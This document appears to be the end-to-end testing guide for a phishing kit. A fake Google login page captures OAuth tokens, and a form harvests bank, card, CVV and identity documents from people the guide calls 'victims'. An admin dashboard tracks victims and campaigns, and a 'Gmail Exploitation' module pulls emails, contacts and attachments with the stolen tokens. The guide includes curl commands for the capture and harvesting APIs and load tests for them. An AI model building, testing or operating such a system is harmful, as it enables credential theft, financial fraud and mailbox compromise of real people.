# End-to-End Testing Guide

## Overview

This guide covers testing the complete flow from OAuth capture → Registration → Admin dashboard → Gmail exploitation.

## Prerequisites

1. Backend server running (`npm start` in `backend/`)
2. Admin web running (`npm run dev` in `static/admin/`)
3. Merchant web accessible (served by backend at `/merchant/`)
4. Database seeded with default admin user and campaign
5. PostgreSQL database running

## Test Flow 1: OAuth Capture → Registration

### Step 1: OAuth Capture (Google)

1. Navigate to: `http://localhost:3000/merchant/google_auth.html?campaign_id=<campaign_id>`
2. Enter test credentials:
   - Email: `test@example.com`
   - Password: `testpassword123`
3. Click "Sign in"
4. **Expected Result:**
   - OAuth tokens captured
   - Redirect to registration page with `victim_id` in URL
   - Victim record created in database
   - OAuth token stored (encrypted)

### Step 2: Registration Form

1. On registration page, fill out form:
   - Personal information
   - Bank account details
   - Upload identity documents (optional)
2. Submit form
3. **Expected Result:**
   - Form data saved
   - Card information encrypted
   - Files uploaded to storage
   - Victim record updated
   - Success message displayed

### Verification in Database

```sql
-- Check victim created
SELECT id, email, capture_method, campaign_id 
FROM victims 
WHERE email = 'test@example.com';

-- Check OAuth token stored
SELECT id, provider, token_status 
FROM oauth_tokens 
WHERE victim_id = '<victim_id>';

-- Check registration completed
SELECT card_information, identity_verification 
FROM victims 
WHERE email = 'test@example.com';
```

## Test Flow 2: Admin Dashboard

### Step 1: Login to Admin Portal

1. Navigate to: `http://localhost:5173/admin` (or admin web URL)
2. Login with:
   - Username: `admin`
   - Password: `admin123`
3. **Expected Result:**
   - Successful login
   - Redirect to dashboard
   - JWT token stored

### Step 2: View Dashboard

1. Check dashboard statistics
2. **Expected Result:**
   - Total victims count displayed
   - Recent victims shown
   - Campaign performance metrics
   - Real-time updates via Socket.IO

### Step 3: View Victims

1. Navigate to Victims page
2. **Expected Result:**
   - List of victims displayed
   - Filtering options work
   - Pagination works
   - Search functionality works
   - OAuth tokens visible for each victim

### Step 4: View Campaigns

1. Navigate to Campaigns page
2. **Expected Result:**
   - Campaigns list displayed
   - Default campaign visible
   - Campaign statistics shown
   - Can create new campaigns

## Test Flow 3: Gmail Exploitation

### Step 1: Select Victim with OAuth Token

1. Navigate to Gmail Exploitation page
2. Search for victim with OAuth token
3. Select victim
4. **Expected Result:**
   - Victim details displayed
   - OAuth tokens listed
   - Token status shown

### Step 2: Initiate Gmail Access

1. Select an active OAuth token
2. Choose extraction type (emails, contacts, attachments, or full)
3. Click "Bắt đầu Extraction"
4. **Expected Result:**
   - Gmail access session created
   - Extraction started
   - Progress displayed
   - Status updates in real-time

### Step 3: View Extraction Results

1. Wait for extraction to complete
2. **Expected Result:**
   - Results displayed
   - Emails list shown
   - Contacts list shown
   - Attachments list shown
   - Export options available

### Verification in Database

```sql
-- Check Gmail access log
SELECT session_id, status, extraction_results 
FROM gmail_access_logs 
WHERE victim_id = '<victim_id>'
ORDER BY created_at DESC 
LIMIT 1;

-- Check activity log
SELECT action_type, action_category, target 
FROM activity_logs 
WHERE action_type LIKE '%gmail%'
ORDER BY timestamp DESC 
LIMIT 5;
```

## Test Flow 4: Real-Time Updates (Socket.IO)

### Step 1: Open Admin Dashboard

1. Login to admin portal
2. Open dashboard in one browser tab
3. **Expected Result:**
   - Socket.IO connection established
   - Connection status indicator shows "Connected"

### Step 2: Trigger Event

1. In another browser/incognito window:
   - Complete OAuth capture
   - Submit registration form
2. **Expected Result:**
   - Dashboard updates in real-time
   - New victim notification appears
   - Statistics refresh automatically
   - Toast notification shown

### Step 3: Campaign Updates

1. Create or update a campaign
2. **Expected Result:**
   - Campaign list updates in real-time
   - Statistics refresh
   - Notification shown

## Test Flow 5: API Endpoints

### Test OAuth Capture API

```bash
curl -X POST http://localhost:3000/api/capture/oauth \
  -H "Content-Type: application/json" \
  -d '{
    "tokenData": {
      "access_token": "test_token",
      "refresh_token": "test_refresh",
      "email": "test@example.com"
    },
    "provider": "google",
    "metadata": {
      "campaignId": "<campaign_id>",
      "ip_address": "127.0.0.1"
    }
  }'
```

**Expected Response:**
```json
{
  "success": true,
  "victim_id": "<uuid>",
  "redirect_url": "/register.html?victim_id=<uuid>"
}
```

### Test Registration API

```bash
curl -X POST http://localhost:3000/api/merchant/register \
  -F "victim_id=<victim_id>" \
  -F "fullName=Test User" \
  -F "email=test@example.com" \
  -F "phone=0123456789" \
  -F "bankName=Vietcombank" \
  -F "accountNumber=1234567890" \
  -F "cardNumber=4111111111111111" \
  -F "cardExpiry=12/25" \
  -F "cardCVV=123" \
  -F "identityCard=@/path/to/file.pdf" \
  -F "selfie=@/path/to/image.jpg"
```

**Expected Response:**
```json
{
  "success": true,
  "message": "Registration completed successfully"
}
```

### Test Admin Victims API

```bash
curl -X GET "http://localhost:3000/api/admin/victims?page=1&limit=20" \
  -H "Authorization: Bearer <admin_token>"
```

**Expected Response:**
```json
{
  "success": true,
  "data": [...],
  "pagination": {
    "page": 1,
    "limit": 20,
    "total": 10,
    "totalPages": 1
  }
}
```

### Test Dashboard API

```bash
curl -X GET http://localhost:3000/api/admin/dashboard \
  -H "Authorization: Bearer <admin_token>"
```

**Expected Response:**
```json
{
  "success": true,
  "data": {
    "statistics": {
      "totalVictims": 10,
      "totalCampaigns": 1,
      "recentVictims": 5,
      ...
    },
    "campaignPerformance": [...]
  }
}
```

## Common Issues & Solutions

### Issue: Database Connection Error

**Solution:**
- Check `DATABASE_URL` in `.env`
- Verify PostgreSQL is running
- Check database exists

### Issue: Prisma Client Not Generated

**Solution:**
```bash
cd backend
npm run db:generate
```

### Issue: Migration Errors

**Solution:**
```bash
cd backend
npm run db:reset  # WARNING: Deletes all data
```

### Issue: Authentication Fails

**Solution:**
- Verify admin user exists: `npm run db:seed`
- Check JWT_SECRET in `.env`
- Clear browser localStorage

### Issue: Socket.IO Not Connecting

**Solution:**
- Check backend Socket.IO server is running
- Verify CORS settings
- Check browser console for errors
- Verify Socket.IO namespace `/admin` is accessible

### Issue: File Upload Fails

**Solution:**
- Check `storage/` directory exists and is writable
- Verify multer configuration
- Check file size limits

## Performance Testing

### Load Test OAuth Capture

```bash
# Using Apache Bench
ab -n 100 -c 10 -p oauth_payload.json -T application/json \
  http://localhost:3000/api/capture/oauth
```

### Load Test Registration

```bash
# Using curl in loop
for i in {1..50}; do
  curl -X POST http://localhost:3000/api/merchant/register \
    -F "victim_id=<victim_id>" \
    -F "fullName=User $i" \
    ...
done
```

## Security Testing

### Test Encryption

1. Capture OAuth token
2. Check database - token should be encrypted
3. Decrypt using admin API (with proper permissions)
4. **Expected:** Decrypted token matches original

### Test Authentication

1. Try accessing admin API without token
2. **Expected:** 401 Unauthorized

3. Try accessing with invalid token
4. **Expected:** 401 Unauthorized

### Test Permissions

1. Create user with limited permissions
2. Try accessing restricted endpoints
3. **Expected:** 403 Forbidden

## Next Steps

After completing all test flows:

1. Document any issues found
2. Create bug reports for failures
3. Verify all features work as expected
4. Check performance metrics
5. Review security measures
